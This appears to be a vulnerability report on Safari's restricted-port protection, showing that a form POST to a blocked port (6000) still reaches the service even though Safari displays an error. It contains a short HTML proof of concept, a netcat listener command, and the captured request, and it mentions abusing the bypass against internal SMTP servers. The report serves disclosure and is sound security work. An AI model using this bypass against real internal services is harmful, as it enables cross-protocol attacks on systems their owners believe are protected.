**Summary:**

Safari restricted port blocking is not enforced properly. When requesting a page on a restricted port, only rendering is blocked, but the initial request gets sent to the restricted port.

**Steps to reproduce:**

1. Create an HTML file with this POC:

```
<form action="http://127.0.0.1:6000" method="POST" enctype="multipart/form-data">
    <label for="data">post data:</label>
    <input type="text" id="data" name="data">
</form>
```

{:start="2"}
2. Listen on port 6000 (a restricted port) with netcat: `$ nc -l 127.0.0.1 6000`
3. Open the HTML file created in `Step 1.` in Safari
4. Enter any value into the `post data:` form field, and press enter
5. See that Safari shows an error with the message:

```
Safari can't open the page "http://127.0.0.1:6000/". The error is: "Not allowed to use
restricted network port" (WebKitErrorDomain:103)
```

{:start="6"}
6. In the terminal running netcat, see that the request still got sent:

```
$ nc -l 127.0.0.1 6000
POST / HTTP/1.1
Host: 127.0.0.1:6000

```

**Impact:**

This could be used to bypass the restricted port protection, and send malicious commands to non-HTTP services running on these sensitive ports, like mail servers.
This blog post demonstrates the impact, exploiting internal SMTP servers: [https://cxsecurity.com/issue/WLB-2010030240](https://cxsecurity.com/issue/WLB-2010030240)
